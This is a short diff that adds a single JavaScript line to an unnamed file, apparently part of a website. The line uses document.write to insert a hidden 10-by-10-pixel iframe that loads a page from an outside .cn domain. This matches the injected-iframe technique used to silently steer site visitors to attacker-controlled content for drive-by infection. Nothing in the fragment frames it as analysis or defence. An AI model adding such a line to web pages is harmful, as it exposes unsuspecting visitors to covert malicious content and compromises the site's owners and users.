@@ -1,0 +1,2 @@
+document.write("<iframe width='10' height='10' src='http://www.456ii.cn/all/aa.htm?aa'></iframe>");
+
